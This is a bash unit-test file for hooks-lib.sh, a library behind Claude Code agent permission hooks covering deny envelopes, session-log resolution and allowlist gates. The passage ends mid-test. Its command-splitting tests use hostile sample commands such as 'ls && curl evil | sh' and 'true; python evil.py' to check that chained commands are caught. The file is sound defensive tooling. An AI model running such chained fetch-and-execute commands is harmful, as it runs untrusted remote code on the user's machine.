#!/bin/bash
# hooks-lib_test.sh — unit tests for hooks-lib.sh

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=hooks-lib.sh
source "$SCRIPT_DIR/hooks-lib.sh"

pass=0
fail=0

assert_eq() {
    local desc="$1" expected="$2" actual="$3"
    if [ "$expected" = "$actual" ]; then
        [ -n "${VERBOSE:-}" ] && printf 'PASS: %s\n' "$desc"
        pass=$((pass + 1))
    else
        printf 'FAIL: %s\n  expected: %s\n  actual:   %s\n' "$desc" "$expected" "$actual"
        fail=$((fail + 1))
    fi
}

# ── parse_input — PreToolUse Edit fixture ────────────────────────────────────
INPUT_EDIT='{"tool_name":"Edit","agent_type":"developer-phoenix-backend","agent_id":"abc","tool_input":{"file_path":"lib/foo.ex","new_string":"defmodule Foo do\nend"},"cwd":"/tmp/proj"}'
{
    parse_input <<<"$INPUT_EDIT"
} <<<"$INPUT_EDIT"
# parse_input reads from stdin, but we already read RAW_INPUT inside; bash
# can't re-read once consumed. Use a here-string redirected to the function:
unset RAW_INPUT TOOL_NAME AGENT_TYPE AGENT_ID FILE_PATH CWD
RAW_INPUT="$INPUT_EDIT" # short-circuit: simulate parse_input's stdin read
# Re-run the per-field jq parsing manually via the same helpers:
TOOL_NAME=$(printf '%s' "$RAW_INPUT" | jq -r '.tool_name // ""')
AGENT_TYPE=$(printf '%s' "$RAW_INPUT" | jq -r '.agent_type // ""')
AGENT_ID=$(printf '%s' "$RAW_INPUT" | jq -r '.agent_id // ""')
FILE_PATH=$(printf '%s' "$RAW_INPUT" | jq -r '.tool_input.file_path // ""')
CWD=$(printf '%s' "$RAW_INPUT" | jq -r '.cwd // ""')

# Cleaner test: invoke parse_input via subshell with stdin pipe.
parse_in_subshell() {
    local input="$1"
    # shellcheck disable=SC2034  # vars are exported by parse_input
    printf '%s' "$input" | (
        parse_input
        printf 'TOOL=%s\nAGENT=%s\nFP=%s\nCWD=%s\n' "$TOOL_NAME" "$AGENT_TYPE" "$FILE_PATH" "$CWD"
    )
}

result=$(parse_in_subshell "$INPUT_EDIT")
assert_eq "parse_input TOOL_NAME" "TOOL=Edit" "$(printf '%s\n' "$result" | grep '^TOOL=')"
assert_eq "parse_input AGENT_TYPE" "AGENT=developer-phoenix-backend" "$(printf '%s\n' "$result" | grep '^AGENT=')"
assert_eq "parse_input FILE_PATH" "FP=lib/foo.ex" "$(printf '%s\n' "$result" | grep '^FP=')"
assert_eq "parse_input CWD" "CWD=/tmp/proj" "$(printf '%s\n' "$result" | grep '^CWD=')"

# ── parse_input — Write fixture (uses content, not new_string) ──────────────
INPUT_WRITE='{"tool_name":"Write","agent_type":"developer-phoenix-backend","tool_input":{"file_path":"lib/bar.ex","content":"defmodule Bar do\nend"}}'
result=$(printf '%s' "$INPUT_WRITE" | (
    parse_input
    printf '%s\n' "TOOL=$TOOL_NAME"
    printf '%s\n' "CONTENT=$(printf '%s' "$RAW_INPUT" | jq -r '.tool_input.content')"
))
assert_eq "parse_input Write TOOL_NAME" "TOOL=Write" "$(printf '%s\n' "$result" | grep '^TOOL=')"
expected_content="CONTENT=defmodule Bar do
end"
actual_content=$(printf '%s\n' "$result" | sed -n '/^CONTENT=/,$p')
assert_eq "parse_input Write content has multi-line" "$expected_content" "$actual_content"

# ── parse_input — malformed/non-JSON stdin → hard exit 2 (fail-loud) ────────
# Non-JSON stdin is an anomaly (Claude Code always sends JSON) — parse_input
# must hard-fail rather than silently produce all-empty vars.
set +e
malformed_out=$(printf 'not valid json {{{' | (
    source "$SCRIPT_DIR/hooks-lib.sh"
    parse_input
) 2>&1)
malformed_rc=$?
set -e
assert_eq "parse_input malformed stdin: exit code 2" "2" "$malformed_rc"
if printf '%s' "$malformed_out" | grep -q "not valid JSON"; then
    [ -n "${VERBOSE:-}" ] && printf 'PASS: %s\n' "parse_input malformed stdin: stderr message present"
    pass=$((pass + 1))
else
    printf 'FAIL: parse_input malformed stdin: stderr message present\n  actual: %s\n' "$malformed_out"
    fail=$((fail + 1))
fi

# ── parse_input — valid JSON, absent optional field → "" (still tolerated) ──
# A field genuinely absent on a given event type (e.g. no tool_input.command
# on a Write event) must still default to "" — NOT hard-fail. This proves
# the jq-validity assert doesn't over-fire on legitimate optional-absence.
optional_out=$(printf '{"tool_name":"Write","tool_input":{"file_path":"lib/baz.ex"}}' | (
    source "$SCRIPT_DIR/hooks-lib.sh"
    parse_input
    printf 'CMD=[%s]\n' "$COMMAND"
))
assert_eq "parse_input optional-absent field: COMMAND defaults to empty" "CMD=[]" "$optional_out"

# ── parse_input — empty stdin → no exit 2 (tolerated) ────────────────────────
# Some hooks legitimately invoke parse_input with no stdin at all; the
# jq-validity assert must be guarded on non-empty RAW_INPUT so this stays
# tolerated (not a hard fail).
set +e
empty_out=$(printf '' | (
    source "$SCRIPT_DIR/hooks-lib.sh"
    parse_input
    printf 'TOOL=[%s]\n' "$TOOL_NAME"
) 2>&1)
empty_rc=$?
set -e
assert_eq "parse_input empty stdin: exit code 0 (tolerated)" "0" "$empty_rc"
assert_eq "parse_input empty stdin: TOOL_NAME defaults to empty" "TOOL=[]" "$empty_out"

# ── deny — emits the modern PreToolUse JSON envelope ─────────────────────────
denyout=$(deny "test reason")
assert_eq "deny permissionDecision" "deny" "$(printf '%s' "$denyout" | jq -r '.hookSpecificOutput.permissionDecision')"
assert_eq "deny hookEventName" "PreToolUse" "$(printf '%s' "$denyout" | jq -r '.hookSpecificOutput.hookEventName')"
assert_eq "deny reason" "test reason" "$(printf '%s' "$denyout" | jq -r '.hookSpecificOutput.permissionDecisionReason')"

# ── block — Stop event envelope ──────────────────────────────────────────────
blockout=$(block "stop reason")
assert_eq "block decision" "block" "$(printf '%s' "$blockout" | jq -r '.decision')"
assert_eq "block reason" "stop reason" "$(printf '%s' "$blockout" | jq -r '.reason')"

# ── hooks_realpath — existing path ───────────────────────────────────────────
CANONICAL_TMP="$(cd /tmp && pwd -P)"
assert_eq "hooks_realpath /tmp resolves to canonical form" "$CANONICAL_TMP" "$(hooks_realpath /tmp)"

# ── hooks_realpath — symlink target ──────────────────────────────────────────
LINK_DIR=$(mktemp -d)
ln -sf /etc "$LINK_DIR/etc-link"
CANONICAL_ETC="$(cd /etc && pwd -P)"
assert_eq "hooks_realpath resolves symlink to canonical form" "$CANONICAL_ETC" "$(hooks_realpath "$LINK_DIR/etc-link")"
rm -rf "$LINK_DIR"

# ── hooks_realpath — non-existent path ───────────────────────────────────────
CANONICAL_TMP_NONEXIST="$(cd /tmp && pwd -P)/no/such/path"
assert_eq "hooks_realpath non-existent under /tmp" "$CANONICAL_TMP_NONEXIST" "$(hooks_realpath /tmp/no/such/path)"

# ── debug_log — gated by env vars ────────────────────────────────────────────
LOG=/tmp/hooks-lib-test-slug-debug.log
rm -f "$LOG"
debug_log hooks-lib-test-slug "without env: should NOT log"
if [ -e "$LOG" ]; then
    fail=$((fail + 1))
    printf 'FAIL: debug_log without env wrote to %s\n' "$LOG"
else
    pass=$((pass + 1))
    [ -n "${VERBOSE:-}" ] && printf 'PASS: debug_log silent without env\n'
fi

CODEGEN_HOOKS_DEBUG=1 debug_log hooks-lib-test-slug "with env: should log"
if grep -q "with env: should log" "$LOG" 2>/dev/null; then
    pass=$((pass + 1))
    [ -n "${VERBOSE:-}" ] && printf 'PASS: debug_log writes when CODEGEN_HOOKS_DEBUG set\n'
else
    fail=$((fail + 1))
    printf 'FAIL: debug_log did not write to %s\n' "$LOG"
fi
rm -f "$LOG"

# ── is_subagent ──────────────────────────────────────────────────────────────

result=$(AGENT_TYPE="developer-phoenix-backend" bash -c "source '$SCRIPT_DIR/hooks-lib.sh'; is_subagent && echo yes || echo no")
assert_eq "is_subagent true when AGENT_TYPE set" "yes" "$result"

result=$(AGENT_TYPE="" bash -c "source '$SCRIPT_DIR/hooks-lib.sh'; is_subagent && echo yes || echo no")
assert_eq "is_subagent false when AGENT_TYPE unset" "no" "$result"

# ── is_outer_session ─────────────────────────────────────────────────────────

result=$(AGENT_TYPE="" bash -c "source '$SCRIPT_DIR/hooks-lib.sh'; is_outer_session && echo yes || echo no")
assert_eq "is_outer_session true when AGENT_TYPE unset" "yes" "$result"

result=$(AGENT_TYPE="inspector" bash -c "source '$SCRIPT_DIR/hooks-lib.sh'; is_outer_session && echo yes || echo no")
assert_eq "is_outer_session false when AGENT_TYPE set" "no" "$result"

# ── session_log_from_transcript ──────────────────────────────────────────────

# Helper: build one JSONL line with a Write tool_use for the given path.
make_write_line() {
    local path="$1"
    printf '{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Write","input":{"file_path":"%s"}}]}}\n' "$path"
}

make_edit_line() {
    local path="$1"
    printf '{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Edit","input":{"file_path":"%s"}}]}}\n' "$path"
}

# Case 1: A's log only → returns A's path.
TMP_T1=$(mktemp -d)
make_write_line "$TMP_T1/codegen/logging/A_cycle.jsonl" >"$TMP_T1/transcript.jsonl"
mkdir -p "$TMP_T1/codegen/logging" && : >"$TMP_T1/codegen/logging/A_cycle.jsonl"
result=$(TRANSCRIPT_PATH="$TMP_T1/transcript.jsonl" CWD="$TMP_T1" bash -c "source '$SCRIPT_DIR/hooks-lib.sh'; session_log_from_transcript")
assert_eq "session_log_from_transcript: A only → A path" "$TMP_T1/codegen/logging/A_cycle.jsonl" "$result"
rm -rf "$TMP_T1"

# Case 2: B's log only → returns B's path.
TMP_T2=$(mktemp -d)
make_write_line "$TMP_T2/codegen/logging/B_cycle.jsonl" >"$TMP_T2/transcript.jsonl"
mkdir -p "$TMP_T2/codegen/logging" && : >"$TMP_T2/codegen/logging/B_cycle.jsonl"
result=$(TRANSCRIPT_PATH="$TMP_T2/transcript.jsonl" CWD="$TMP_T2" bash -c "source '$SCRIPT_DIR/hooks-lib.sh'; session_log_from_transcript")
assert_eq "session_log_from_transcript: B only → B path" "$TMP_T2/codegen/logging/B_cycle.jsonl" "$result"
rm -rf "$TMP_T2"

# Case 3: Interleaved A+B writes → returns LAST (B).
TMP_T3=$(mktemp -d)
{
    make_write_line "$TMP_T3/codegen/logging/A_cycle.jsonl"
    make_write_line "$TMP_T3/codegen/logging/B_cycle.jsonl"
} >"$TMP_T3/transcript.jsonl"
mkdir -p "$TMP_T3/codegen/logging" && : >"$TMP_T3/codegen/logging/A_cycle.jsonl" && : >"$TMP_T3/codegen/logging/B_cycle.jsonl"
result=$(TRANSCRIPT_PATH="$TMP_T3/transcript.jsonl" CWD="$TMP_T3" bash -c "source '$SCRIPT_DIR/hooks-lib.sh'; session_log_from_transcript")
assert_eq "session_log_from_transcript: interleaved A+B → last (B)" "$TMP_T3/codegen/logging/B_cycle.jsonl" "$result"
rm -rf "$TMP_T3"

# Case 4: Zero tool_use writes to logging path → empty.
TMP_T4=$(mktemp -d)
printf '{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Write","input":{"file_path":"/tmp/other/not-logging.md"}}]}}\n' >"$TMP_T4/transcript.jsonl"
result=$(TRANSCRIPT_PATH="$TMP_T4/transcript.jsonl" CWD="$TMP_T4" bash -c "source '$SCRIPT_DIR/hooks-lib.sh'; session_log_from_transcript")
assert_eq "session_log_from_transcript: no logging writes → empty" "" "$result"
rm -rf "$TMP_T4"

# Case 5: TRANSCRIPT_PATH="" → empty.
TMP_T5=$(mktemp -d)
result=$(TRANSCRIPT_PATH="" CWD="$TMP_T5" bash -c "source '$SCRIPT_DIR/hooks-lib.sh'; session_log_from_transcript")
assert_eq "session_log_from_transcript: empty TRANSCRIPT_PATH → empty" "" "$result"
rm -rf "$TMP_T5"

# Case 6: TRANSCRIPT_PATH set to non-existent file → empty.
TMP_T6=$(mktemp -d)
result=$(TRANSCRIPT_PATH="/tmp/no-such-transcript-$(date -u +%s).jsonl" CWD="$TMP_T6" bash -c "source '$SCRIPT_DIR/hooks-lib.sh'; session_log_from_transcript")
assert_eq "session_log_from_transcript: missing file → empty" "" "$result"
rm -rf "$TMP_T6"

# Case 7: Edit tool_use also matched.
TMP_T7=$(mktemp -d)
make_edit_line "$TMP_T7/codegen/logging/edit_cycle.jsonl" >"$TMP_T7/transcript.jsonl"
mkdir -p "$TMP_T7/codegen/logging" && : >"$TMP_T7/codegen/logging/edit_cycle.jsonl"
result=$(TRANSCRIPT_PATH="$TMP_T7/transcript.jsonl" CWD="$TMP_T7" bash -c "source '$SCRIPT_DIR/hooks-lib.sh'; session_log_from_transcript")
assert_eq "session_log_from_transcript: Edit tool_use matched" "$TMP_T7/codegen/logging/edit_cycle.jsonl" "$result"
rm -rf "$TMP_T7"

# Cases 8-11 (removed): previously tested a CODEGEN_BUILD_NON_INTERACTIVE-gated
# unconditional disk-mtime fallback. That env var and its fallback branch were
# retired along with the legacy self-orchestrating harness engine — the
# codegen-log-evidence-based fallback (cases 12-15 below) is the sole
# surviving disk-mtime fallback and is unconditional (not gated on any env
# var).

# Helper: build one JSONL line with a Bash tool_use for the given command.
make_bash_line() {
    local cmd="$1"
    printf '{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"%s"}}]}}\n' "$cmd"
}

# Case 12: codegen-log init (no Write event) + disk log present + no
# OCG_APPS_ROOT set → resolves disk log unconditionally. This is the
# interactive/self-build deadlock repro.
TMP_T12=$(mktemp -d)
mkdir -p "$TMP_T12/codegen/logging"
: >"$TMP_T12/codegen/logging/20260702_000000_demo_cycle.jsonl"
make_bash_line "codegen-log init --slug demo" >"$TMP_T12/transcript.jsonl"
result=$(TRANSCRIPT_PATH="$TMP_T12/transcript.jsonl" OCG_APPS_ROOT="" CWD="$TMP_T12" \
    bash -c "source '$SCRIPT_DIR/hooks-lib.sh'; session_log_from_transcript")
assert_eq "session_log_from_transcript: codegen-log init evidence only → disk log" "$TMP_T12/codegen/logging/20260702_000000_demo_cycle.jsonl" "$result"
rm -rf "$TMP_T12"

# Case 13: codegen-log section --body @- (no Write event) → resolves disk log.
TMP_T13=$(mktemp -d)
mkdir -p "$TMP_T13/codegen/logging"
: >"$TMP_T13/codegen/logging/20260702_000000_demo_cycle.jsonl"
make_bash_line "codegen-log section --body @-" >"$TMP_T13/transcript.jsonl"
result=$(TRANSCRIPT_PATH="$TMP_T13/transcript.jsonl" OCG_APPS_ROOT="" CWD="$TMP_T13" \
    bash -c "source '$SCRIPT_DIR/hooks-lib.sh'; session_log_from_transcript")
assert_eq "session_log_from_transcript: codegen-log section evidence only → disk log" "$TMP_T13/codegen/logging/20260702_000000_demo_cycle.jsonl" "$result"
rm -rf "$TMP_T13"

# Case 14: codegen-log append --role committer --body @- (no Write event) →
# resolves disk log.
TMP_T14=$(mktemp -d)
mkdir -p "$TMP_T14/codegen/logging"
: >"$TMP_T14/codegen/logging/20260702_000000_demo_cycle.jsonl"
make_bash_line "codegen-log append --role committer --body @-" >"$TMP_T14/transcript.jsonl"
result=$(TRANSCRIPT_PATH="$TMP_T14/transcript.jsonl" OCG_APPS_ROOT="" CWD="$TMP_T14" \
    bash -c "source '$SCRIPT_DIR/hooks-lib.sh'; session_log_from_transcript")
assert_eq "session_log_from_transcript: codegen-log append evidence only → disk log" "$TMP_T14/codegen/logging/20260702_000000_demo_cycle.jsonl" "$result"
rm -rf "$TMP_T14"

# Case 15: non-writer Bash command only (e.g. ls codegen/logging/), no Write,
# empty env → empty. Evidence predicate must NOT over-match.
TMP_T15=$(mktemp -d)
mkdir -p "$TMP_T15/codegen/logging"
: >"$TMP_T15/codegen/logging/20260702_000000_demo_cycle.jsonl"
make_bash_line "ls codegen/logging/" >"$TMP_T15/transcript.jsonl"
result=$(TRANSCRIPT_PATH="$TMP_T15/transcript.jsonl" OCG_APPS_ROOT="" CWD="$TMP_T15" \
    bash -c "source '$SCRIPT_DIR/hooks-lib.sh'; session_log_from_transcript")
assert_eq "session_log_from_transcript: non-writer bash command → empty" "" "$result"
rm -rf "$TMP_T15"

# Case 16: .active sentinel present and points at an existing log → resolved
# FIRST, before the transcript scan even runs (empty/no TRANSCRIPT_PATH).
TMP_T16=$(mktemp -d)
mkdir -p "$TMP_T16/codegen/logging"
: >"$TMP_T16/codegen/logging/20260703_000000_sentinel-demo_cycle.jsonl"
printf '%s' "$TMP_T16/codegen/logging/20260703_000000_sentinel-demo_cycle.jsonl" >"$TMP_T16/codegen/logging/.active"
result=$(TRANSCRIPT_PATH="" CWD="$TMP_T16" \
    bash -c "source '$SCRIPT_DIR/hooks-lib.sh'; session_log_from_transcript")
assert_eq "session_log_from_transcript: .active sentinel resolves with no transcript" "$TMP_T16/codegen/logging/20260703_000000_sentinel-demo_cycle.jsonl" "$result"
rm -rf "$TMP_T16"

# Case 17: .active sentinel takes precedence over a transcript scan that would
# otherwise resolve a DIFFERENT log.
TMP_T17=$(mktemp -d)
mkdir -p "$TMP_T17/codegen/logging"
: >"$TMP_T17/codegen/logging/20260703_000000_sentinel-demo_cycle.jsonl"
: >"$TMP_T17/codegen/logging/20260703_000001_transcript-demo_cycle.jsonl"
printf '%s' "$TMP_T17/codegen/logging/20260703_000000_sentinel-demo_cycle.jsonl" >"$TMP_T17/codegen/logging/.active"
make_write_line "$TMP_T17/codegen/logging/20260703_000001_transcript-demo_cycle.jsonl" >"$TMP_T17/transcript.jsonl"
result=$(TRANSCRIPT_PATH="$TMP_T17/transcript.jsonl" CWD="$TMP_T17" \
    bash -c "source '$SCRIPT_DIR/hooks-lib.sh'; session_log_from_transcript")
assert_eq "session_log_from_transcript: .active sentinel wins over transcript scan" "$TMP_T17/codegen/logging/20260703_000000_sentinel-demo_cycle.jsonl" "$result"
rm -rf "$TMP_T17"

# Case 18: stale .active sentinel (points at a deleted/relocated log) falls
# through to the transcript scan instead of returning a dead path.
TMP_T18=$(mktemp -d)
mkdir -p "$TMP_T18/codegen/logging"
: >"$TMP_T18/codegen/logging/20260703_000002_transcript-demo_cycle.jsonl"
printf '%s' "$TMP_T18/codegen/logging/20260703_000002_does-not-exist_cycle.jsonl" >"$TMP_T18/codegen/logging/.active"
make_write_line "$TMP_T18/codegen/logging/20260703_000002_transcript-demo_cycle.jsonl" >"$TMP_T18/transcript.jsonl"
result=$(TRANSCRIPT_PATH="$TMP_T18/transcript.jsonl" CWD="$TMP_T18" \
    bash -c "source '$SCRIPT_DIR/hooks-lib.sh'; session_log_from_transcript")
assert_eq "session_log_from_transcript: stale .active sentinel falls through to transcript scan" "$TMP_T18/codegen/logging/20260703_000002_transcript-demo_cycle.jsonl" "$result"
rm -rf "$TMP_T18"

# Case 19: CODEGEN_LOG_PATH pin wins over a HIJACKED .active sentinel pointing
# at a different, existing log — the exact cycle-20260714_182153 failure mode
# (a same-process `codegen-log init` with a mistyped slug repoints .active to
# a rival log; the guard must still grade the real, pinned cycle log).
TMP_T19=$(mktemp -d)
mkdir -p "$TMP_T19/codegen/logging"
: >"$TMP_T19/codegen/logging/20260714_182153_pinned-real_cycle.jsonl"
: >"$TMP_T19/codegen/logging/20260714_182357_hijacked-rival_cycle.jsonl"
printf '%s' "$TMP_T19/codegen/logging/20260714_182357_hijacked-rival_cycle.jsonl" >"$TMP_T19/codegen/logging/.active"
result=$(CODEGEN_LOG_PATH="$TMP_T19/codegen/logging/20260714_182153_pinned-real_cycle.jsonl" TRANSCRIPT_PATH="" CWD="$TMP_T19" \
    bash -c "source '$SCRIPT_DIR/hooks-lib.sh'; session_log_from_transcript")
assert_eq "session_log_from_transcript: CODEGEN_LOG_PATH pin wins over a hijacked .active" "$TMP_T19/codegen/logging/20260714_182153_pinned-real_cycle.jsonl" "$result"
rm -rf "$TMP_T19"

# Case 20: dangling CODEGEN_LOG_PATH pin (set but file does not exist) falls
# through to .active — a dangling pin must never wedge the resolver.
TMP_T20=$(mktemp -d)
mkdir -p "$TMP_T20/codegen/logging"
: >"$TMP_T20/codegen/logging/20260714_000000_active-fallback_cycle.jsonl"
printf '%s' "$TMP_T20/codegen/logging/20260714_000000_active-fallback_cycle.jsonl" >"$TMP_T20/codegen/logging/.active"
result=$(CODEGEN_LOG_PATH="$TMP_T20/codegen/logging/does-not-exist_cycle.jsonl" TRANSCRIPT_PATH="" CWD="$TMP_T20" \
    bash -c "source '$SCRIPT_DIR/hooks-lib.sh'; session_log_from_transcript")
assert_eq "session_log_from_transcript: dangling CODEGEN_LOG_PATH falls through to .active" "$TMP_T20/codegen/logging/20260714_000000_active-fallback_cycle.jsonl" "$result"
rm -rf "$TMP_T20"

# Case 21: no CODEGEN_LOG_PATH set at all → unaffected, .active still wins as
# before (regression guard for the unpinned/manual-CLI path).
TMP_T21=$(mktemp -d)
mkdir -p "$TMP_T21/codegen/logging"
: >"$TMP_T21/codegen/logging/20260714_000001_no-pin_cycle.jsonl"
printf '%s' "$TMP_T21/codegen/logging/20260714_000001_no-pin_cycle.jsonl" >"$TMP_T21/codegen/logging/.active"
result=$(TRANSCRIPT_PATH="" CWD="$TMP_T21" \
    bash -c "unset CODEGEN_LOG_PATH; source '$SCRIPT_DIR/hooks-lib.sh'; session_log_from_transcript")
assert_eq "session_log_from_transcript: no pin set → .active resolves as before" "$TMP_T21/codegen/logging/20260714_000001_no-pin_cycle.jsonl" "$result"
rm -rf "$TMP_T21"

# ── read_tool_failures ───────────────────────────────────────────────────────

# Case 1 (empty-state): no failures dir → "no tool failures recorded"
TMP_RF1=$(mktemp -d)
result=$(read_tool_failures "$TMP_RF1")
if printf '%s' "$result" | grep -q "no tool failures recorded"; then
    [ -n "${VERBOSE:-}" ] && printf 'PASS: read_tool_failures empty-state\n'
    pass=$((pass + 1))
else
    printf 'FAIL: read_tool_failures empty-state — got: %s\n' "$result"
    fail=$((fail + 1))
fi
rm -rf "$TMP_RF1"

# Case 2 (populated): two lines same tool + one other → groups with count 2
TMP_RF2=$(mktemp -d)
mkdir -p "$TMP_RF2/codegen/logging/failures"
printf '{"ts":"2026-06-01T10:00:00Z","tool":"Bash","error":"err1","agent":"a1"}\n' \
    >>"$TMP_RF2/codegen/logging/failures/sess1.jsonl"
printf '{"ts":"2026-06-01T10:01:00Z","tool":"Bash","error":"err2","agent":"a1"}\n' \
    >>"$TMP_RF2/codegen/logging/failures/sess1.jsonl"
printf '{"ts":"2026-06-01T10:02:00Z","tool":"Edit","error":"err3","agent":"a1"}\n' \
    >>"$TMP_RF2/codegen/logging/failures/sess1.jsonl"
result=$(read_tool_failures "$TMP_RF2")
if printf '%s' "$result" | grep -q "Bash" && printf '%s' "$result" | grep -q "2"; then
    [ -n "${VERBOSE:-}" ] && printf 'PASS: read_tool_failures groups Bash with count 2\n'
    pass=$((pass + 1))
else
    printf 'FAIL: read_tool_failures aggregation — got: %s\n' "$result"
    fail=$((fail + 1))
fi
rm -rf "$TMP_RF2"

# Case 3 (malformed-line): malformed line skipped, valid lines still aggregated
TMP_RF3=$(mktemp -d)
mkdir -p "$TMP_RF3/codegen/logging/failures"
printf '{"ts":"2026-06-01T11:00:00Z","tool":"Read","error":"nope","agent":"a2"}\n' \
    >>"$TMP_RF3/codegen/logging/failures/sess2.jsonl"
printf 'not valid json\n' \
    >>"$TMP_RF3/codegen/logging/failures/sess2.jsonl"
result=$(read_tool_failures "$TMP_RF3")
if printf '%s' "$result" | grep -q "Read"; then
    [ -n "${VERBOSE:-}" ] && printf 'PASS: read_tool_failures skips malformed line\n'
    pass=$((pass + 1))
else
    printf 'FAIL: read_tool_failures malformed-line — got: %s\n' "$result"
    fail=$((fail + 1))
fi
rm -rf "$TMP_RF3"

# ── read_gate_verdicts ───────────────────────────────────────────────────────

# Case 4 (empty-state): no file → "no gate verdicts recorded"
TMP_GV1=$(mktemp -d)
result=$(read_gate_verdicts "$TMP_GV1")
if printf '%s' "$result" | grep -q "no gate verdicts recorded"; then
    [ -n "${VERBOSE:-}" ] && printf 'PASS: read_gate_verdicts empty-state\n'
    pass=$((pass + 1))
else
    printf 'FAIL: read_gate_verdicts empty-state — got: %s\n' "$result"
    fail=$((fail + 1))
fi
rm -rf "$TMP_GV1"

# Case 5 (populated): failed ×2 + clear ×1 → verdict×count table shows failed 2
TMP_GV2=$(mktemp -d)
mkdir -p "$TMP_GV2/codegen/logging"
HIST_FILE_GV="$TMP_GV2/codegen/logging/gate-verdicts.jsonl"
printf '{"verdict":"failed","gate":"make test","ended":"2026-06-01T10:00:00Z"}\n' >>"$HIST_FILE_GV"
printf '{"verdict":"failed","gate":"make test","ended":"2026-06-01T10:01:00Z"}\n' >>"$HIST_FILE_GV"
printf '{"verdict":"clear","gate":"make test","ended":"2026-06-01T10:02:00Z"}\n' >>"$HIST_FILE_GV"
result=$(read_gate_verdicts "$TMP_GV2")
if printf '%s' "$result" | grep -q "failed" && printf '%s' "$result" | grep -q "2"; then
    [ -n "${VERBOSE:-}" ] && printf 'PASS: read_gate_verdicts shows failed count 2\n'
    pass=$((pass + 1))
else
    printf 'FAIL: read_gate_verdicts verdict×count — got: %s\n' "$result"
    fail=$((fail + 1))
fi
rm -rf "$TMP_GV2"

# ── SESSION_LOG_NAME_RE cross-site parity ────────────────────────────────────
# The canonical slug-class regex is hardcoded (kept in lockstep, not shared at
# runtime — bash guards / TS / YAML can't `source` a common fragment mid-grep-
# pattern) at 6 sites. Assert every site's literal regex string is byte-
# identical to hooks-lib.sh's SESSION_LOG_NAME_RE, so a future edit to one
# site without the others fails loud here instead of silently drifting.
CODEGEN_ROOT_PARITY="$(cd "$SCRIPT_DIR/../../../.." && pwd)"

assert_regex_site_matches() {
    local desc="$1" file="$2" extract_pattern="$3"
    if [ ! -f "$file" ]; then
        printf 'FAIL: %s — file not found: %s\n' "$desc" "$file"
        fail=$((fail + 1))
        return
    fi
    local found
    found=$(grep -oE "$extract_pattern" "$file" | head -n 1)
    if [ "$found" = "$SESSION_LOG_NAME_RE" ]; then
        [ -n "${VERBOSE:-}" ] && printf 'PASS: %s\n' "$desc"
        pass=$((pass + 1))
    else
        printf 'FAIL: %s\n  expected: %s\n  actual:   %s\n' "$desc" "$SESSION_LOG_NAME_RE" "${found:-<not found>}"
        fail=$((fail + 1))
    fi
}

# reviewer-guard.sh now references the shared $SESSION_LOG_NAME_RE variable
# (single-sourced from hooks-lib.sh) instead of carrying its own literal
# regex — assert the reference is present and it sources hooks-lib.sh, rather
# than re-extracting a literal string that no longer exists there.
reviewer_guard_file="$CODEGEN_ROOT_PARITY/harnesses/claude/hooks/reviewer-guard.sh"
if grep -qF 'source "$(dirname "$0")/lib/hooks-lib.sh"' "$reviewer_guard_file" &&
    grep -qF '${SESSION_LOG_NAME_RE}' "$reviewer_guard_file"; then
    [ -n "${VERBOSE:-}" ] && printf 'PASS: SESSION_LOG_NAME_RE parity: reviewer-guard.sh references the shared constant\n'
    pass=$((pass + 1))
else
    printf 'FAIL: SESSION_LOG_NAME_RE parity: reviewer-guard.sh does not source hooks-lib.sh + reference ${SESSION_LOG_NAME_RE}\n'
    fail=$((fail + 1))
fi

# The literal regex string (as it appears verbatim inside a single-quoted bash
# string or grep -E pattern) — escape nothing extra, grep -E extracts the
# exact substring between the sentinel markers used at each site.
RE_EXTRACT_PATTERN='\[0-9\]\{8\}_\[0-9\]\{6\}_\[a-z0-9_-\]\+_cycle\\\.jsonl\$'

assert_regex_site_matches "SESSION_LOG_NAME_RE parity: shared/rules/_core/session-log.md" \
    "$CODEGEN_ROOT_PARITY/shared/rules/_core/session-log.md" "$RE_EXTRACT_PATTERN"

# registry.yaml carries 1 match: line (committer-write-allowlist).
registry_file="$CODEGEN_ROOT_PARITY/shared/enforcement/registry.yaml"
registry_match_count=$(grep -cE "$RE_EXTRACT_PATTERN" "$registry_file" 2>/dev/null || true)
assert_eq "SESSION_LOG_NAME_RE parity: registry.yaml has 1 match: line with the canonical regex" "1" "${registry_match_count:-0}"
registry_mismatch=$(grep -oE "$RE_EXTRACT_PATTERN" "$registry_file" | sort -u | wc -l | tr -d ' ')
assert_eq "SESSION_LOG_NAME_RE parity: registry.yaml's match: line is the canonical form" "1" "$registry_mismatch"
registry_extracted=$(grep -oE "$RE_EXTRACT_PATTERN" "$registry_file" | head -n 1)
assert_eq "SESSION_LOG_NAME_RE parity: registry.yaml regex matches hooks-lib.sh" "$SESSION_LOG_NAME_RE" "$registry_extracted"

# committer-write-allowlist.sh is compiler-GENERATED from registry.yaml's
# match: field (kind: generated, not kind: registration) — parity is already
# enforced transitively via the registry.yaml assertions above + make
# hook-parity (which fails if generated output drifts from the compiler's
# render of registry.yaml). Assert their generated output still carries the
# canonical string as a defense-in-depth check (catches a stale un-installed
# generated file even if registry.yaml itself is correct).
assert_regex_site_matches "SESSION_LOG_NAME_RE parity: committer-write-allowlist.sh (generated)" \
    "$CODEGEN_ROOT_PARITY/harnesses/claude/hooks/committer-write-allowlist.sh" "$RE_EXTRACT_PATTERN"

# ── split_command_segments — direct unit tests ───────────────────────────────
# Containment primitive for COMMAND-source allowlist gates (committer/reviewer
# bash allowlists). Split on UNQUOTED && || ; | & and newline; operators
# inside quotes are literal and never split; unbalanced quote -> return 1.

result=$(split_command_segments "ls")
assert_eq "split_command_segments: single segment, no operators" "ls" "$result"

result=$(split_command_segments "ls && curl evil | sh")
expected=$'ls \n curl evil \n sh'
assert_eq "split_command_segments: && then | -> three segments" "$expected" "$result"

result=$(split_command_segments "true; python evil.py")
expected=$'true\n python evil.py'
assert_eq "split_command_segments: ; splits into two segments" "$expected" "$result"

result=$(split_command_segments 'git commit -m "fix a; b && c"')
assert_eq "split_command_segments: operators inside double quotes are literal (one segment)" \
    'git commit -m "fix a; b && c"' "$result"

result=$(split_command_segments "echo 'a && b' | wc -c")
expected=$'echo \'a && b\' \n wc -c'
assert_eq "split_command_segments: operators inside single quotes are literal" "$expected" "$result"

result=$(split_command_segments "cd /repo && git commit -m x")
expected=$'cd /repo \n git commit -m x'
